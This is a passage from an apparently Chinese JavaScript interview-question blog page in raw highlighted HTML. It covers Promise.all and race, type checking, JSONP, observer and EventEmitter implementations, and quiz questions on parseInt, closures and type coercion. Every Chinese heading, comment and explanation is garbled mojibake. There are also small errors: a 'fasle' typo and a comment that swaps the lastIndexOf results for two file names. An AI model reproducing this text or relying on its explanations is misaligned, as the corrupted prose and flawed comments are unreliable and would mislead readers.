&#123;</span><br><span class="line">            res[i] = data</span><br><span class="line">            <span class="keyword">if</span> (++count === arr.length)</span><br><span class="line">              resolve(res)</span><br><span class="line">          &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">              reject(err)</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç° race</span></span><br><span class="line"><span class="built_in">Promise</span>.myrace = <span class="function"><span class="keyword">function</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!(arr[i] <span class="keyword">instanceof</span> <span class="built_in">Promise</span>)) &#123;</span><br><span class="line">        <span class="built_in">Promise</span>.resolve(arr[i]).then(resolve, reject)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        arr[i].then(resolve, reject)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¦‚ä½•å°è£…ä¸€ä¸ª-javascript-çš„ç±»å‹åˆ¤æ–­å‡½æ•°ï¼Ÿ"><a href="#å¦‚ä½•å°è£…ä¸€ä¸ª-javascript-çš„ç±»å‹åˆ¤æ–­å‡½æ•°ï¼Ÿ" class="headerlink" title="å¦‚ä½•å°è£…ä¸€ä¸ª javascript çš„ç±»å‹åˆ¤æ–­å‡½æ•°ï¼Ÿ"></a>å¦‚ä½•å°è£…ä¸€ä¸ª javascript çš„ç±»å‹åˆ¤æ–­å‡½æ•°ï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getType</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// åˆ¤æ–­æ•°æ®æ˜¯ null çš„æƒ…å†µ</span></span><br><span class="line">  <span class="keyword">if</span> (value === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> value + <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ¤æ–­æ•°æ®æ˜¯å¼•ç”¨ç±»å‹çš„æƒ…å†µ</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> value === <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> valueClass = <span class="built_in">Object</span>.prototype.toString.call(value),</span><br><span class="line">      type = valueClass.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    type.pop();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> type.join(<span class="string">&quot;&quot;</span>).toLowerCase();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// åˆ¤æ–­æ•°æ®æ˜¯åŸºæœ¬æ•°æ®ç±»å‹çš„æƒ…å†µå’Œå‡½æ•°çš„æƒ…å†µ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ‰‹å†™ä¸€ä¸ª-jsonp"><a href="#æ‰‹å†™ä¸€ä¸ª-jsonp" class="headerlink" title="æ‰‹å†™ä¸€ä¸ª jsonp"></a>æ‰‹å†™ä¸€ä¸ª jsonp</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">url, params, callback</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// åˆ¤æ–­æ˜¯å¦å«æœ‰å‚æ•°</span></span><br><span class="line">  <span class="keyword">let</span> queryString = url.indexOf(<span class="string">&quot;?&quot;</span>) === -<span class="number">1</span> ? <span class="string">&quot;?&quot;</span> : <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ·»åŠ å‚æ•°</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> params) &#123;</span><br><span class="line">    <span class="keyword">if</span> (params.hasOwnProperty(k)) &#123;</span><br><span class="line">      queryString += k + <span class="string">&quot;=&quot;</span> + params[k] + <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¤„ç†å›è°ƒå‡½æ•°å</span></span><br><span class="line">  <span class="keyword">let</span> random = <span class="built_in">Math</span>.random()</span><br><span class="line">      .toString()</span><br><span class="line">      .replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>),</span><br><span class="line">    callbackName = <span class="string">&quot;myJsonp&quot;</span> + random;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ·»åŠ å›è°ƒå‡½æ•°</span></span><br><span class="line">  queryString += <span class="string">&quot;callback=&quot;</span> + callbackName;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ„å»ºè¯·æ±‚</span></span><br><span class="line">  <span class="keyword">let</span> scriptNode = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  scriptNode.src = url + queryString;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>[callbackName] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨å›è°ƒå‡½æ•°</span></span><br><span class="line">    callback(...arguments);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ é™¤è¿™ä¸ªå¼•å…¥çš„è„šæœ¬</span></span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].removeChild(scriptNode);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‘èµ·è¯·æ±‚</span></span><br><span class="line">  <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].appendChild(scriptNode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ‰‹å†™ä¸€ä¸ªè§‚å¯Ÿè€…æ¨¡å¼ï¼Ÿ"><a href="#æ‰‹å†™ä¸€ä¸ªè§‚å¯Ÿè€…æ¨¡å¼ï¼Ÿ" class="headerlink" title="æ‰‹å†™ä¸€ä¸ªè§‚å¯Ÿè€…æ¨¡å¼ï¼Ÿ"></a>æ‰‹å†™ä¸€ä¸ªè§‚å¯Ÿè€…æ¨¡å¼ï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> events = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> topics = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="comment">// æ³¨å†Œç›‘å¬å‡½æ•°</span></span><br><span class="line">    <span class="attr">subscribe</span>: <span class="function"><span class="keyword">function</span>(<span class="params">topic, handler</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!topics.hasOwnProperty(topic)) &#123;</span><br><span class="line">        topics[topic] = [];</span><br><span class="line">      &#125;</span><br><span class="line">      topics[topic].push(handler);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‘å¸ƒäº‹ä»¶ï¼Œè§¦å‘è§‚å¯Ÿè€…å›è°ƒäº‹ä»¶</span></span><br><span class="line">    <span class="attr">publish</span>: <span class="function"><span class="keyword">function</span>(<span class="params">topic, info</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (topics.hasOwnProperty(topic)) &#123;</span><br><span class="line">        topics[topic].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">handler</span>) </span>&#123;</span><br><span class="line">          handler(info);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç§»é™¤ä¸»é¢˜çš„ä¸€ä¸ªè§‚å¯Ÿè€…çš„å›è°ƒäº‹ä»¶</span></span><br><span class="line">    <span class="attr">remove</span>: <span class="function"><span class="keyword">function</span>(<span class="params">topic, handler</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!topics.hasOwnProperty(topic)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> handlerIndex = -<span class="number">1</span>;</span><br><span class="line">      topics[topic].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item, index</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (item === handler) &#123;</span><br><span class="line">          handlerIndex = index;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (handlerIndex &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        topics[topic].splice(handlerIndex, <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç§»é™¤ä¸»é¢˜çš„æ‰€æœ‰è§‚å¯Ÿè€…çš„å›è°ƒäº‹ä»¶</span></span><br><span class="line">    <span class="attr">removeAll</span>: <span class="function"><span class="keyword">function</span>(<span class="params">topic</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (topics.hasOwnProperty(topic)) &#123;</span><br><span class="line">        topics[topic] = [];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="EventEmitter-å®ç°"><a href="#EventEmitter-å®ç°" class="headerlink" title="EventEmitter å®ç°"></a>EventEmitter å®ç°</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventEmitter</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.events = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">on</span>(<span class="params">event, callback</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> callbacks = <span class="built_in">this</span>.events[event] || [];</span><br><span class="line">    callbacks.push(callback);</span><br><span class="line">    <span class="built_in">this</span>.events[event] = callbacks;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">off</span>(<span class="params">event, callback</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> callbacks = <span class="built_in">this</span>.events[event];</span><br><span class="line">    <span class="built_in">this</span>.events[event] = callbacks &amp;&amp; callbacks.filter(<span class="function"><span class="params">fn</span> =&gt;</span> fn !== callback);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">emit</span>(<span class="params">event, ...args</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> callbacks = <span class="built_in">this</span>.events[event];</span><br><span class="line">    callbacks.forEach(<span class="function"><span class="params">fn</span> =&gt;</span> &#123;</span><br><span class="line">      fn(...args);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">once</span>(<span class="params">event, callback</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> wrapFun = <span class="function">(<span class="params">...args</span>) =&gt;</span> &#123;</span><br><span class="line">      callback(...args);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">this</span>.off(event, wrapFun);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">this</span>.on(event, wrapFun);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JavaScriptä»£ç é¢˜"><a href="#JavaScriptä»£ç é¢˜" class="headerlink" title="JavaScriptä»£ç é¢˜"></a>JavaScriptä»£ç é¢˜</h1><h2 id="â€œ1â€-â€œ2â€-â€œ3â€-map-parseInt-ç­”æ¡ˆæ˜¯å¤šå°‘ï¼Ÿ"><a href="#â€œ1â€-â€œ2â€-â€œ3â€-map-parseInt-ç­”æ¡ˆæ˜¯å¤šå°‘ï¼Ÿ" class="headerlink" title="[â€œ1â€, â€œ2â€, â€œ3â€].map(parseInt) ç­”æ¡ˆæ˜¯å¤šå°‘ï¼Ÿ"></a>[â€œ1â€, â€œ2â€, â€œ3â€].map(parseInt) ç­”æ¡ˆæ˜¯å¤šå°‘ï¼Ÿ</h2><p>parseInt() å‡½æ•°èƒ½è§£æä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œéœ€è¦ä¸¤ä¸ªå‚æ•° (val, radix)ï¼Œå…¶ä¸­ radix è¡¨ç¤ºè¦è§£æçš„æ•°å­—çš„åŸºæ•°ã€‚ï¼ˆè¯¥å€¼ä»‹äº 2 ~ 36 ä¹‹é—´ï¼Œå¹¶ä¸”å­—ç¬¦ä¸²ä¸­çš„æ•°å­—ä¸èƒ½å¤§äº radix æ‰èƒ½æ­£ç¡®è¿”å›æ•°å­—ç»“æœå€¼ï¼‰ã€‚å½“å‚æ•° <code>radix</code> çš„å€¼ä¸º <code>0</code>ï¼Œæˆ–æ²¡æœ‰è®¾ç½®è¯¥å‚æ•°æ—¶ï¼Œ<code>parseInt()</code> ä¼šæ ¹æ® <code>string</code> æ¥åˆ¤æ–­æ•°å­—çš„åŸºæ•°ã€‚</p><p>æ­¤å¤„ map ä¼ äº† 3 ä¸ªå‚æ•° (element, index, array)ï¼Œé»˜è®¤ç¬¬ä¸‰ä¸ªå‚æ•°è¢«å¿½ç•¥æ‰ï¼Œå› æ­¤ä¸‰æ¬¡ä¼ å…¥çš„å‚æ•°åˆ†åˆ«ä¸º â€œ1-0â€, â€œ2-1â€, â€œ3-2â€</p><p>å› ä¸ºå­—ç¬¦ä¸²çš„å€¼ä¸èƒ½å¤§äºåŸºæ•°ï¼Œå› æ­¤åé¢ä¸¤æ¬¡è°ƒç”¨å‡å¤±è´¥ï¼Œè¿”å› NaN ï¼Œç¬¬ä¸€æ¬¡åŸºæ•°ä¸º 0 ï¼ŒæŒ‰åè¿›åˆ¶è§£æè¿”å› 1ã€‚ [ 1, NaN, NaN ]</p><h2 id="forEach-call-quot-quot-function-a-a-style-outline-quot-1px-solid-quot-Math-random-1-lt-lt-24-toString-16-èƒ½è§£é‡Šä¸€ä¸‹è¿™æ®µä»£ç çš„æ„æ€å—ï¼Ÿ"><a href="#forEach-call-quot-quot-function-a-a-style-outline-quot-1px-solid-quot-Math-random-1-lt-lt-24-toString-16-èƒ½è§£é‡Šä¸€ä¸‹è¿™æ®µä»£ç çš„æ„æ€å—ï¼Ÿ" class="headerlink" title="[].forEach.call($$(&quot;*&quot;),function(a){a.style.outline=&quot;1px solid #&quot;+(~~(Math.random()*(1&lt;&lt;24))).toString(16)}) èƒ½è§£é‡Šä¸€ä¸‹è¿™æ®µä»£ç çš„æ„æ€å—ï¼Ÿ"></a><code>[].forEach.call($$(&quot;*&quot;),function(a)&#123;a.style.outline=&quot;1px solid #&quot;+(~~(Math.random()*(1&lt;&lt;24))).toString(16)&#125;)</code> èƒ½è§£é‡Šä¸€ä¸‹è¿™æ®µä»£ç çš„æ„æ€å—ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰é€‰å–é¡µé¢æ‰€æœ‰ DOM å…ƒç´ ã€‚<br>åœ¨æµè§ˆå™¨çš„æ§åˆ¶å°ä¸­å¯ä»¥ä½¿ç”¨$$()æ–¹æ³•æ¥è·å–é¡µé¢ä¸­ç›¸åº”çš„å…ƒç´ ï¼Œè¿™æ˜¯ç°ä»£æµè§ˆå™¨æä¾›çš„ä¸€ä¸ªå‘½ä»¤è¡Œ API ç›¸å½“äº document.querySelectorAll æ–¹æ³•ã€‚</p><p>ï¼ˆ2ï¼‰å¾ªç¯éå† DOM å…ƒç´ ã€‚</p><p>ï¼ˆ3ï¼‰ç»™å…ƒç´ æ·»åŠ  outline ã€‚<br>ç”±äºæ¸²æŸ“çš„ outline æ˜¯ä¸åœ¨ CSS ç›’æ¨¡å‹ä¸­çš„ï¼Œæ‰€ä»¥ä¸ºå…ƒç´ æ·»åŠ  outline å¹¶ä¸ä¼šå½±å“å…ƒç´ çš„å¤§å°å’Œé¡µé¢çš„å¸ƒå±€ã€‚</p><p>ï¼ˆ4ï¼‰ç”Ÿæˆéšæœºé¢œè‰²å‡½æ•°ã€‚<br>Math.random()*(1&lt;&lt;24) å¯ä»¥å¾—åˆ° 0~2^24 - 1 ä¹‹é—´çš„éšæœºæ•°ï¼Œå› ä¸ºå¾—åˆ°çš„æ˜¯ä¸€ä¸ªæµ®ç‚¹æ•°ï¼Œä½†æˆ‘ä»¬åªéœ€è¦æ•´æ•°éƒ¨åˆ†ï¼Œä½¿ç”¨å–åæ“ä½œç¬¦ ~ è¿ç»­ä¸¤æ¬¡å–åè·å¾—æ•´æ•°éƒ¨åˆ†ï¼Œç„¶åå†ç”¨ toString(16) çš„æ–¹å¼ï¼Œè½¬æ¢ä¸ºä¸€ä¸ªåå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²ã€‚</p><h2 id="ä¸‹é¢è¿™ä¸ªJSç¨‹åºçš„è¾“å‡ºæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸‹é¢è¿™ä¸ªJSç¨‹åºçš„è¾“å‡ºæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸‹é¢è¿™ä¸ªJSç¨‹åºçš„è¾“å‡ºæ˜¯ä»€ä¹ˆï¼Ÿ"></a>ä¸‹é¢è¿™ä¸ªJSç¨‹åºçš„è¾“å‡ºæ˜¯ä»€ä¹ˆï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i++);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f1 = Foo(),</span><br><span class="line">    f2 = Foo();</span><br><span class="line">f1();</span><br><span class="line">f1();</span><br><span class="line">f2();</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜è€ƒå¯Ÿ<strong>é—­åŒ…</strong>å’Œ<strong>å¼•ç”¨ç±»å‹å¯¹è±¡</strong>çš„çŸ¥è¯†ç‚¹ï¼š</p><ul><li>ä¸€èˆ¬æ¥è¯´å‡½æ•°æ‰§è¡Œå®Œåå®ƒçš„å±€éƒ¨å˜é‡å°±ä¼šéšç€å‡½æ•°è°ƒç”¨ç»“æŸè¢«é”€æ¯ï¼Œä½†æ˜¯ Foo() è¿”å›äº†ä¸€ä¸ªåŒ¿åå‡½æ•°çš„å¼•ç”¨ï¼ˆå³ä¸€ä¸ª<strong>é—­åŒ…</strong>ï¼‰ï¼Œå®ƒå¯ä»¥è®¿é—®åˆ° Foo() è¢«è°ƒç”¨äº§ç”Ÿçš„ç¯å¢ƒï¼Œè€Œå±€éƒ¨å˜é‡ i ä¸€ç›´å¤„åœ¨è¿™ä¸ªç¯å¢ƒä¸­ï¼Œåªè¦ä¸€ä¸ªç¯å¢ƒæœ‰å¯èƒ½è¢«è®¿é—®åˆ°ï¼Œå®ƒå°±ä¸ä¼šè¢«é”€æ¯ï¼Œæ‰€ä»¥è¯´<strong>é—­åŒ…æœ‰å»¶ç»­å˜é‡ä½œç”¨åŸŸçš„åŠŸèƒ½</strong>ã€‚å‰ä¸¤æ¬¡è¾“å‡º 0 1ã€‚</li><li>Foo() è¿”å›çš„æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œæ‰€ä»¥ f1ï¼Œf2 ç›¸å½“äºæŒ‡å‘äº†ä¸¤ä¸ªä¸åŒçš„å‡½æ•°å¯¹è±¡ï¼Œæœ€åè¾“å‡º 0ã€‚</li></ul><h2 id="ä¸‹é¢ä»£ç çš„ç»“æœï¼Ÿ"><a href="#ä¸‹é¢ä»£ç çš„ç»“æœï¼Ÿ" class="headerlink" title="ä¸‹é¢ä»£ç çš„ç»“æœï¼Ÿ"></a>ä¸‹é¢ä»£ç çš„ç»“æœï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(([])?<span class="literal">true</span>:<span class="literal">false</span>); </span><br><span class="line"><span class="built_in">console</span>.log(([]==<span class="literal">false</span>?<span class="literal">true</span>:<span class="literal">false</span>)); </span><br><span class="line"><span class="built_in">console</span>.log((&#123;&#125;==<span class="literal">false</span>)?<span class="literal">true</span>:<span class="literal">false</span>) </span><br></pre></td></tr></table></figure><p>é¢˜ç›®çš„ç±»å‹è½¬æ¢ç»“æœï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Boolean</span>([]); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">Number</span>([]); <span class="comment">//0</span></span><br><span class="line"><span class="built_in">Number</span>(&#123;&#125;); <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">false</span>); <span class="comment">//0</span></span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(([])?<span class="literal">true</span>:fasle);<span class="comment">// =&gt; console.log((true)?true:false);</span></span><br><span class="line"><span class="built_in">console</span>.log([]==<span class="literal">false</span>?<span class="literal">true</span>:<span class="literal">false</span>); <span class="comment">// =&gt; console.log(0==0?true:false);</span></span><br><span class="line"><span class="built_in">console</span>.log((&#123;&#125;==<span class="literal">false</span>)?<span class="literal">true</span>:<span class="literal">false</span>); <span class="comment">// =&gt; console.log((NaN==0)?true:false);</span></span><br></pre></td></tr></table></figure><h2 id="ä¸‹é¢ä»£ç çš„ç»“æœï¼Ÿ-1"><a href="#ä¸‹é¢ä»£ç çš„ç»“æœï¼Ÿ-1" class="headerlink" title="ä¸‹é¢ä»£ç çš„ç»“æœï¼Ÿ"></a>ä¸‹é¢ä»£ç çš„ç»“æœï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> <span class="built_in">Boolean</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (x) &#123;</span><br><span class="line">  alert(<span class="string">&#x27;hi&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> y = <span class="built_in">Boolean</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (y) &#123;</span><br><span class="line">  alert(<span class="string">&#x27;hello&#x27;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>if(x) è¿™é‡ŒæœŸæœ› x æ˜¯ä¸€ä¸ªå¸ƒå°”ç±»å‹çš„åŸå§‹å€¼ï¼Œè€Œ x æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œ<strong>ä»»ä½•å¯¹è±¡è½¬ä¸ºå¸ƒå°”å€¼ï¼Œéƒ½ä¸ºå¾—åˆ° true</strong>ï¼ˆåˆ‡è®°ï¼åœ¨ JS ä¸­ï¼Œåªæœ‰ 0ï¼Œ-0ï¼ŒNaNï¼Œâ€â€ï¼Œnullï¼Œundefined è¿™å…­ä¸ªå€¼è½¬å¸ƒå°”å€¼æ—¶ï¼Œç»“æœä¸º falseï¼‰ã€‚</li></ul><h2 id="ä½¿ç”¨-JS-å®ç°è·å–æ–‡ä»¶æ‰©å±•åï¼Ÿ"><a href="#ä½¿ç”¨-JS-å®ç°è·å–æ–‡ä»¶æ‰©å±•åï¼Ÿ" class="headerlink" title="ä½¿ç”¨ JS å®ç°è·å–æ–‡ä»¶æ‰©å±•åï¼Ÿ"></a>ä½¿ç”¨ JS å®ç°è·å–æ–‡ä»¶æ‰©å±•åï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// String.lastIndexOf() æ–¹æ³•è¿”å›æŒ‡å®šå€¼ï¼ˆæœ¬ä¾‹ä¸­çš„&#x27;.&#x27;ï¼‰åœ¨è°ƒç”¨è¯¥æ–¹æ³•çš„å­—ç¬¦ä¸²ä¸­æœ€åå‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æ‰¾åˆ°åˆ™è¿”å› -1ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹äº &#x27;filename&#x27; å’Œ &#x27;.hiddenfile&#x27; ï¼ŒlastIndexOf çš„è¿”å›å€¼åˆ†åˆ«ä¸º 0 å’Œ -1 æ— ç¬¦å·å³ç§»æ“ä½œç¬¦(&gt;&gt;&gt;) å°† -1 è½¬æ¢ä¸º 4294967295 ï¼Œå°† -2 è½¬æ¢ä¸º 4294967294 ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥ä¿è¯è¾¹ç¼˜æƒ…å†µæ—¶æ–‡ä»¶åä¸å˜ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// String.prototype.slice() ä»ä¸Šé¢è®¡ç®—çš„ç´¢å¼•å¤„æå–æ–‡ä»¶çš„æ‰©å±•åã€‚å¦‚æœç´¢å¼•æ¯”æ–‡ä»¶åçš„é•¿åº¦å¤§ï¼Œç»“æœä¸º&quot;&quot;ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFileExtension</span>(<span class="params">filename</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> filename.slice(((filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">0</span>) + <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦ä¸ºç©ºå¯¹è±¡ï¼Ÿ"><a href="#å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦ä¸ºç©ºå¯¹è±¡ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦ä¸ºç©ºå¯¹è±¡ï¼Ÿ"></a>å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦ä¸ºç©ºå¯¹è±¡ï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNullObj</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.keys(obj).length === <span class="number">0</span> &amp;&amp; <span class="built_in">Object</span>.getOwnPropertySymbols(obj).length === <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨é—­åŒ…å®ç°æ¯éš”ä¸€ç§’æ‰“å°-1-2-3-4"><a href="#ä½¿ç”¨é—­åŒ…å®ç°æ¯éš”ä¸€ç§’æ‰“å°-1-2-3-4" class="headerlink" title="ä½¿ç”¨é—­åŒ…å®ç°æ¯éš”ä¸€ç§’æ‰“å° 1,2,3,4"></a>ä½¿ç”¨é—­åŒ…å®ç°æ¯éš”ä¸€ç§’æ‰“å° 1,2,3,4</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨é—­åŒ…å®ç°</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;, i * <span class="number">1000</span>);</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ let å—çº§ä½œç”¨åŸŸ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">  &#125;, i * <span class="number">1000</span>);</span><br><span 